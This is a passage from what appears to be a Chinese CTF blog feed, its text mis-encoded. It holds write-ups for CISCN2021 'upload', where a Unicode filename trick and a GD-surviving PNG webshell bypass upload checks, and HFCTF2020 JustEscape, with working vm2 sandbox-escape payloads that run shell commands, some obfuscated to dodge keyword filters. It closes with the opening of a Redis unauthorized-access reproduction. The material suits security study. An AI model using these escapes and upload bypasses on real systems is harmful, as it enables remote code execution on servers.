= k[0];        k[0] = k[1];        k[1] = k[2];        k[2] = k[3];        k[3] = tmp;    &#125;    for (int i = 42 - 4; i &gt;= 0; i--)    &#123;        unsigned char r0 = b[i + 0], r1 = b[i + 1], r2 = b[i + 2], r3 = b[i + 3];        unsigned char tmp = k[3];        k[3] = k[2];        k[2] = k[1];        k[1] = k[0];        k[0] = tmp;        b[i + 0] = r2 ^ k[2];        b[i + 1] = r3 ^ k[3];        b[i + 2] = ((k[0] + (b[i + 0] &gt;&gt; 4)) &amp; 0xff) ^ r0;        b[i + 3] = ((k[1] + (b[i + 1] &gt;&gt; 2)) &amp; 0xff) ^ r1;    &#125;    for (int i = 0; i &lt; 42; i++)    &#123;        printf(&quot;%c&quot;, b[i]);    &#125;    return 0;&#125;</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529201614424.png" alt="image-20220529201614424"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ciscn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webéšç¼˜åˆ·</title>
      <link href="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/"/>
      <url>/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/</url>
      
        <content type="html"><![CDATA[<p>å”‰ï¼Œciscnå¿«å¼€äº†ï¼Œctfå¤ªå·äº†ï¼Œåšåšä»¥å‰é¢˜ç»ƒä¸€ä¸‹æ‰‹å§</p><p>[TOC]</p><h1 id="CISCN2021-Quals-upload"><a href="#CISCN2021-Quals-upload" class="headerlink" title="[CISCN2021 Quals]upload"></a>[CISCN2021 Quals]upload</h1><p>æºç :</p><pre><code class="php">&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123;    highlight_file(__FILE__);    die();&#125;if(isset($_GET[&quot;ctf&quot;]))    $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;upload&quot;) &#123;    if ($_FILES[&#39;postedFile&#39;][&#39;size&#39;] &gt; 1024*512) &#123;        die(&quot;è¿™ä¹ˆå¤§ä¸ªçš„ä¸œè¥¿ä½ æ˜¯æƒ³dæˆ‘å—ï¼Ÿ&quot;);    &#125;    $imageinfo = getimagesize($_FILES[&#39;postedFile&#39;][&#39;tmp_name&#39;]);    if ($imageinfo === FALSE) &#123;        die(&quot;å¦‚æœä¸èƒ½å¥½å¥½ä¼ å›¾ç‰‡çš„è¯å°±è¿˜æ˜¯ä¸è¦æ¥æ‰“æ‰°æˆ‘äº†&quot;);    &#125;    if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) &#123;        die(&quot;ä¸œè¥¿ä¸èƒ½æ–¹æ–¹æ­£æ­£çš„è¯å°±å¾ˆè®¨åŒ&quot;);    &#125;    $fileName=urldecode($_FILES[&#39;postedFile&#39;][&#39;name&#39;]);    if(stristr($fileName,&quot;c&quot;) || stristr($fileName,&quot;i&quot;) || stristr($fileName,&quot;h&quot;) || stristr($fileName,&quot;ph&quot;)) &#123;        die(&quot;æœ‰äº›ä¸œè¥¿è®©ä½ ä¼ ä¸Šå»çš„è¯é‚£å¯ä¸å¾—äº†&quot;);    &#125;    $imagePath = &quot;image/&quot; . mb_strtolower($fileName);    if(move_uploaded_file($_FILES[&quot;postedFile&quot;][&quot;tmp_name&quot;], $imagePath)) &#123;        echo &quot;upload success, image at $imagePath&quot;;    &#125; else &#123;        die(&quot;ä¼ éƒ½æ²¡æœ‰ä¼ ä¸Šå»&quot;);    &#125;&#125;</code></pre><p>å®¡è®¡ä¸‹è¿™ä¸ªä»£ç ï¼Œä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œæ ¡éªŒå¤§å°â€“&gt;æ ¡éªŒå›¾ç‰‡é«˜å’Œå®½â€“&gt;è¿‡æ»¤â€™câ€™,â€™iâ€™,â€™hâ€™,â€™phâ€™â€“&gt;æˆåŠŸä¸Šä¼ orå¤±è´¥</p><p>æ— æ³•ä¸Šä¼ phpğŸï¼Œæ— æ³•åˆ©ç”¨.htacesså’Œ.user.iniï¼Œ</p><p>é‚£å°±</p><p>æ‰«æä¸€ä¸‹ç›®å½•ï¼Œåˆå‘ç°äº†ä¸€ä¸ªæºç </p><p>example.php</p><pre><code class="php"> &lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123;    highlight_file(__FILE__);    die();&#125;if(isset($_GET[&quot;ctf&quot;]))    $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;poc&quot;) &#123;    $zip = new \ZipArchive();    $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;];    if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) &#123;        die(&quot;è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ&quot;);    &#125;    if ($zip-&gt;open($name_for_zip) !== TRUE) &#123;        die (&quot;éƒ½ä¸èƒ½è§£å‹å‘¢&quot;);    &#125;    echo &quot;å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ&quot;;    $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);    $zip-&gt;extractTo($pos_for_zip);    $zip-&gt;close();    unlink($name_for_zip);    $files = glob(&quot;$pos_for_zip/*&quot;);    foreach($files as $file)&#123;        if (is_dir($file)) &#123;            continue;        &#125;        $first = imagecreatefrompng($file);        $size = min(imagesx($first), imagesy($first));        $second = imagecrop($first, [&#39;x&#39; =&gt; 0, &#39;y&#39; =&gt; 0, &#39;width&#39; =&gt; $size, &#39;height&#39; =&gt; $size]);        if ($second !== FALSE) &#123;            $final_name = pathinfo($file)[&quot;basename&quot;];            imagepng($second, &#39;example/&#39;.$final_name);            imagedestroy($second);        &#125;        imagedestroy($first);        unlink($file);    &#125;&#125;</code></pre><p>è¿™æ®µä»£ç çš„å¤§è‡´ä½œç”¨æ˜¯è§£å‹ä¸€ä¸ªzipæ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬å°±è¦æ€è€ƒæ˜¯å¦å¯ä»¥æŠŠphpæ”¾å…¥zipä¸­ï¼Œé‚£å°±éœ€è¦æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªzipæ–‡ä»¶ï¼Œä½†æ˜¯iè¢«è¿‡æ»¤</p><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨mb_strtolowerå‡½æ•°ç»•è¿‡ï¼Œå®ƒæ˜¯æ”¯æŒUnicodeçš„</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123323158.png" alt="image-20220519123323158"></p><p>å¤§è‡´çš„æ„æ€å°±æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªå­—ç¬¦Unicodeå»æ›¿æ¢i</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123635184.png" alt="image-20220519123635184"></p><pre><code class="php">&lt;?phpvar_dump(mb_strtolower(&#39;Ä°&#39;)===&#39;i&#39;);?&gt;</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123728624.png" alt="image-20220519123728624"></p><p>è¯¦è§:<a href="https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/">https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/</a></p><p>ç»•è¿‡äº†iä¹‹åæˆ‘ä»¬è¿˜è¦ç»•è¿‡é«˜å’Œå®½</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨xmbç»•è¿‡</p><pre><code>#define test_width 1#define test_height 1</code></pre><p>é™¤æ­¤ä¹‹å¤–å®ƒè¿˜æœ‰ä¸€ä¸ªå‡½æ•°è¿‡æ»¤ï¼Œé˜»æ­¢æˆ‘ä»¬åœ¨å›¾ç‰‡ä¸­æ”¾å…¥æ¶æ„çš„php</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519124806416.png" alt="image-20220519124806416"></p><p>é€šå¸¸ï¼Œç³»ç»Ÿåœ¨å®ç°å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œä¸ºäº†é˜²èŒƒç”¨æˆ·ä¸Šä¼ å«æœ‰æ¶æ„ php ä»£ç çš„å›¾ç‰‡ï¼Œå¯é‡‡ç”¨ gd åº“é‡å»ºå›¾ç‰‡ï¼Œgd åº“é‡å»ºå›¾ç‰‡çš„ä¸€ç³»åˆ—å‡½æ•° imagecreatefrom*ï¼Œä¼šæ£€æŸ¥å›¾ç‰‡è§„èŒƒï¼ŒéªŒè¯å›¾ç‰‡åˆæ³•æ€§ï¼Œä»¥æ­¤æŠµå¾¡å›¾ç‰‡ä¸­å«æœ‰æ¶æ„ php ä»£ç çš„æ”»å‡»ã€‚</p><p>å¦‚æœç›´æ¥åœ¨å›¾ç‰‡æœ€åå†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œä¼šè¢«GDåº“ç»™å»æ‰ã€‚ç»•è¿‡GDåº“å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="http://www.vuln.cn/6411">http://www.vuln.cn/6411</a></p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å·¥å…·:<a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator%E6%9D%A5%E5%B8%AE%E5%8A%A9%E6%88%91%E4%BB%AC%E7%BB%95%E8%BF%87">https://github.com/huntergregal/PNG-IDAT-Payload-Generatoræ¥å¸®åŠ©æˆ‘ä»¬ç»•è¿‡</a></p><p>ä½¿ç”¨è„šæœ¬ç”Ÿæˆå›¾ç‰‡ğŸ</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519125046671.png" alt="image-20220519125046671"></p><p>ä¿®æ”¹åç¼€ä¸ºphpå¹¶æ”¾å…¥zipä¸­</p><p>åˆ›å»ºä¸€ä¸ªtxtæ–‡ä»¶ï¼Œé‡Œé¢å†™å…¥</p><pre><code>#define test_width 1#define test_height 1</code></pre><p>æ³¨:ç¬¬ä¸€è¡Œè¦ç©ºå‡ºæ¥æ¢è¡Œï¼Œä¸ç„¶æ— æ³•è¯†åˆ«</p><p>ç„¶åå°†txtè¿½åŠ åˆ°zipå</p><pre><code>copy shell.zip/b+1.txt/a dd.zip</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130016829.png" alt="image-20220519130016829"></p><p>ç„¶åå°±å¯ä»¥æ¥ä¸Šä¼ äº†</p><p>è‡ªå·±æ„å»ºä¸€ä¸ªhtml postæ–‡ä»¶ä¸Šä¼ ç•Œé¢:</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POSTæ•°æ®åŒ…POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://05b1ebab-02ca-4b72-bf12-1b21695d609d.node4.buuoj.cn:81/upload.php?ctf=upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt;    &lt;label for=&quot;file&quot;&gt;æ–‡ä»¶åï¼š&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;postedFile&quot; id=&quot;postedFile&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519125541638.png" alt="image-20220519125541638"></p><p>æŠ“åŒ…ï¼Œä¿®æ”¹i</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130133680.png" alt="image-20220519130133680"></p><p>æˆåŠŸä¸Šä¼ </p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130059694.png" alt="image-20220519130059694"></p><p>ç„¶åä½¿ç”¨exampleé¡µé¢è§£å‹</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519133936518.png" alt="image-20220519133936518"></p><p>æˆåŠŸè§£å‹ï¼Œè¿è¡Œä¸‹</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134029090.png" alt="image-20220519134029090"></p><p>ä¸‹é¢æ¥æ‰¾flag</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134213040.png" alt="image-20220519134213040"></p><p>è¯»å–ä¸‹è¿™ä¸ªæ–‡ä»¶</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134241496.png" alt="image-20220519134241496"></p><h1 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h1><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519144418792.png" alt="image-20220519144418792"></p><p>çœŸçš„æ˜¯phpå—ï¼Ÿ</p><p>æ—¢ç„¶è¿™ä¹ˆæç¤ºäº†é‚£è‚¯å®šä¸æ˜¯ï¼Œæµ‹ä¸€ä¸‹node.js</p><p>ä¼ å…¥ Error().stack</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519145031732.png" alt="image-20220519145031732"></p><p>ç¡®å®æ˜¯jsï¼Œæ˜¯vm2çš„æ²™ç®±é€ƒé€¸é—®é¢˜</p><p>githubæœ‰ç°æˆpoc:</p><pre><code class="js">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function()&#123;    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try&#123;        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    &#125;catch(e)&#123;        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(untrusted));&#125;catch(x)&#123;    console.log(x);&#125;</code></pre><p>æˆ–è€…</p><pre><code class="js">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function()&#123;    try&#123;        Buffer.from(new Proxy(&#123;&#125;, &#123;            getOwnPropertyDescriptor()&#123;                throw f=&gt;f.constructor(&quot;return process&quot;)();            &#125;        &#125;));    &#125;catch(e)&#123;        return e(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(untrusted));&#125;catch(x)&#123;    console.log(x);&#125;</code></pre><p>æ„é€ æˆfunctionä¼ å…¥</p><pre><code class="js">(function() &#123;        &quot;use strict&quot;;    const &#123;VM&#125; = require(&#39;vm2&#39;);    const untrusted = &#39;(&#39; + function()&#123;        TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();        try&#123;            Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;        &#125;catch(e)&#123;            return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();        &#125;    &#125;+&#39;)()&#39;;    try&#123;        console.log(new VM().run(untrusted));    &#125;catch(x)&#123;        console.log(x);    &#125;&#125;)()</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519150121586.png" alt="image-20220519150121586"></p><p>åº”è¯¥å…³é”®å­—è¢«è¿‡æ»¤äº†</p><p>ç»•è¿‡:</p><p>1ã€åœ¨å…³é”®å­—å­—æ¯ä¸ŠåŠ ä¸Š `</p><pre><code class="js">(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+/flag`)[`toString`](); &#125; &#125;)()</code></pre><p>2ã€javascriptçš„æ¨¡ç‰ˆæ–‡å­—ç»•è¿‡</p><p>prototypeå˜æˆ`${`${`prototyp`}e`}`</p><pre><code class="js">(function ()&#123;    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)();    try&#123;        Object.preventExtensions(Buffer.from(``)).a = 1;    &#125;catch(e)&#123;        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();    &#125;&#125;)()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redisæœªæˆæƒè®¿é—®æ¼æ´å¤ç°</title>
      <link href="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="redisä»‹ç»"><a href="#redisä»‹ç»" class="headerlink" title="redisä»‹ç»"></a>redisä»‹ç»</h1><p>Redisæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€ Key-Valueæ•°æ®åº“ã€‚å’ŒMemcachedç±»ä¼¼ï¼Œå®ƒæ”¯æŒå­˜å‚¨çš„value ç±»å‹ç›¸å¯¹æ›´å¤šï¼ŒåŒ…æ‹¬ string(å­—ç¬¦ä¸²)ã€list ( é“¾è¡¨)ã€ set(é›†åˆ)ã€zset(sorted set â€“ æœ‰åºé›†åˆ)å’Œ  hashï¼ˆå“ˆå¸Œç±»å‹ï¼‰ã€‚è¿™äº›æ•°æ®ç±»å‹éƒ½æ”¯æŒpush/pop ã€ add/remove  åŠå–äº¤é›†å¹¶é›†å’Œå·®é›†åŠæ›´ä¸°å¯Œçš„æ“ä½œï¼Œè€Œä¸”è¿™äº›æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„ã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼Œ redisæ”¯æŒå„ç§ä¸åŒæ–¹å¼çš„æ’åºã€‚ä¸ memcached  ä¸€æ ·ï¼Œä¸ºäº†ä¿è¯æ•ˆç‡ï¼Œæ•°æ®éƒ½æ˜¯ç¼“å­˜åœ¨å†…å­˜ä¸­ã€‚åŒºåˆ«çš„æ˜¯ redis  ä¼šå‘¨æœŸæ€§çš„æŠŠæ›´æ–°çš„æ•°æ®å†™å…¥ç£ç›˜æˆ–è€…æŠŠä¿®æ”¹æ“ä½œå†™å…¥è¿½åŠ çš„è®°å½•æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šå®ç°äº† master-slave ( ä¸»ä»)åŒæ­¥ã€‚</p><h1 id="æ¼æ´ä»‹ç»"><a href="#æ¼æ´ä»‹ç»" class="headerlink" title="æ¼æ´ä»‹ç»"></a>æ¼æ´ä»‹ç»</h1><p>Rediså› é…ç½®ä¸å½“å¯ä»¥å¯¼è‡´æœªæˆæƒè®¿é—®ï¼Œè¢«æ”»å‡»è€…æ¶æ„åˆ©ç”¨ã€‚å½“å‰æµè¡Œçš„é’ˆå¯¹Redisæœªæˆæƒè®¿é—®çš„ä¸€ç§æ–°å‹æ”»å‡»æ–¹å¼ï¼Œåœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼Œå¦‚æœRedisä»¥rootèº«ä»½è¿è¡Œï¼Œé»‘å®¢å¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•å—å®³æœåŠ¡å™¨ï¼Œå¯å¯¼è‡´æœåŠ¡å™¨æƒé™è¢«è·å–å’Œæ•°æ®åˆ é™¤ã€æ³„éœ²æˆ–åŠ å¯†å‹’ç´¢äº‹ä»¶å‘ç”Ÿï¼Œä¸¥é‡å±å®³ä¸šåŠ¡æ­£å¸¸æœåŠ¡ã€‚ã€€ã€€éƒ¨åˆ†æœåŠ¡å™¨ä¸Šçš„Redis ç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œå¹¶ä¸”æ²¡æœ‰å¼€å¯è®¤è¯ï¼ˆè¿™æ˜¯Redis  çš„é»˜è®¤é…ç½®ï¼‰ï¼Œä»¥åŠè¯¥ç«¯å£å¯ä»¥é€šè¿‡å…¬ç½‘ç›´æ¥è®¿é—®ï¼Œå¦‚æœæ²¡æœ‰é‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œå°†ä¼šå¯¼è‡´ Redis  æœåŠ¡ç›´æ¥æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå¯èƒ½é€ æˆå…¶ä»–ç”¨æˆ·å¯ä»¥ç›´æ¥åœ¨éæˆæƒæƒ…å†µä¸‹ç›´æ¥è®¿é—®RedisæœåŠ¡å¹¶è¿›è¡Œç›¸å…³æ“ä½œã€‚ç›®å‰æ¯”è¾ƒä¸»æµçš„æ¡ˆä¾‹ï¼šyam2 minerd  æŒ–çŸ¿ç¨‹åºï¼Œè¿˜æœ‰åœ¨å¤šæ¬¡åº”æ€¥äº‹ä»¶ä¸­å‘ç°å¤§é‡çš„watch-smartdæŒ–çŸ¿æœ¨é©¬ã€‚</p><h1 id="æ¼æ´äº§ç”Ÿæ¡ä»¶"><a href="#æ¼æ´äº§ç”Ÿæ¡ä»¶" class="headerlink" title="æ¼æ´äº§ç”Ÿæ¡ä»¶"></a>æ¼æ´äº§ç”Ÿæ¡ä»¶</h1><p>1ã€redisæœåŠ¡ç»‘å®šåœ¨0.0.0.0:6379ç«¯å£ï¼Œè€Œä¸”ä¿¡ä»»äº†å…¶ä»–IPï¼Œå¯¼è‡´äº†RedisæœåŠ¡æš´éœ²åœ¨å…¬ç½‘ä¸Š</p><p>2ã€æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼Œå¯ä»¥å…å¯†ç™»é™†RedisæœåŠ¡</p><h1 id="æ¼æ´å±å®³"><a href="#æ¼æ´å±å®³" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h1><p>1ã€å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæ¶æ„æ‰§è¡Œflushallæ¸…ç©ºæ‰€æœ‰æ•°æ®</p><p>2ã€é€šè¿‡Evalæ‰§è¡ŒLuaä»£ç ï¼Œé€šè¿‡å¤‡ä»½åŠŸèƒ½å¾€ç£ç›˜å†™å…¥åé—¨æ–‡ä»¶</p><p>3ã€å¦‚æœRedisæœåŠ¡ä»¥rootèº«ä»½è¿è¡Œï¼Œå¯ä»¥ç»™rootç”¨æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»é™†æœåŠ¡å™¨</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>é¶æœº: centos7.5 é˜¿é‡Œäº‘ 39.105.x.x    å»ºè®®ç”¨centos</p><p>æ”»å‡»æœº: kali2022 </p><p>redis 3.2.11</p><p>1.ä¸‹è½½å®‰è£…redis</p><pre><code>wget http://download.redis.io/releases/redis-3.2.11.tar.gz</code></pre><p>2.è§£å‹å‹ç¼©åŒ…</p><pre><code>tar zxvf redis-3.2.11.tar.gz</code></pre><p>3.è¿›å…¥è§£å‹ç›®å½•redis-3.2.11 æ‰§è¡Œmakeå‘½ä»¤</p><pre><code>cd redis-3.2.11make</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426232909091.png" alt="image-20220426232909091"></p><p>4.è¿›å…¥srcç›®å½•</p><pre><code>cd src</code></pre><p>5.å°†redis-serverå’Œredis-cliæ‹·è´åˆ°/usr/binç›®å½•ä¸‹ï¼ˆè¿™æ ·å¯åŠ¨redis-serverå’Œredis-cliå°±ä¸ç”¨æ¯æ¬¡éƒ½è¿›å…¥å®‰è£…ç›®å½•äº†ï¼‰</p><pre><code>cp redis-server /usr/bin/cp redis-cli /usr/bin/</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426233508159.png" alt="image-20220426233508159"></p><p>6.è¿”å›ç›®å½•redis-3.2.11,å°†redis.confæ‹·è´åˆ°/etc/ç›®å½•ä¸‹</p><pre><code>cd ..cp redis.conf /etc/</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426234155118.png" alt="image-20220426234155118"></p><p>7.ä½¿ç”¨/etc/ç›®å½•ä¸‹çš„redis.confæ–‡ä»¶ä¸­çš„é…ç½®å¯åŠ¨redisæœåŠ¡</p><pre><code>redis-server /etc/redis.conf</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426234331895.png" alt="image-20220426234331895"></p><p>8.ç¼–è¾‘etcä¸­çš„redisé…ç½®æ–‡ä»¶redis.conf</p><pre><code>vim /etc/redis.conf</code></pre><p>å»æ‰ipç»‘å®šï¼Œå…è®¸é™¤æœ¬åœ°å¤–çš„ä¸»æœºè¿œç¨‹ç™»å½•redisæœåŠ¡ å‰é¢åŠ #æ³¨é‡Šæ‰</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430165832466.png" alt="image-20220430165832466"></p><p>å…³é—­ä¿æŠ¤æ¨¡å¼ï¼Œå…è®¸è¿œç¨‹è¿æ¥redisæœåŠ¡å°†yes æ”¹ä¸ºno</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426235216372.png" alt="image-20220426235216372"></p><p>æœ€åé‡å¯ä¸‹redisæœåŠ¡å°±ok</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>é¦–å…ˆæµ‹è¯•ä¸‹ç›®æ ‡é¶æœºæ˜¯å¦å­˜åœ¨æœªæˆæƒè®¿é—®</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430174535586.png" alt="image-20220430174535586"></p><p>æˆåŠŸè¿æ¥ä¸Šäº†ï¼Œä¸‹é¢å¼€å§‹è¿›ä¸€æ­¥åˆ©ç”¨</p><h2 id="1-å†™å…¥webshell"><a href="#1-å†™å…¥webshell" class="headerlink" title="1.å†™å…¥webshell"></a><strong>1.å†™å…¥webshell</strong></h2><p>å†™å…¥ä¸€å¥è¯æœ¨é©¬éœ€è¦æˆ‘ä»¬çŸ¥é“ç½‘ç«™çš„æ ¹ç›®å½•ç›¸å¯¹äºæœåŠ¡å™¨çš„ç»å¯¹è·¯å¾„</p><p><img 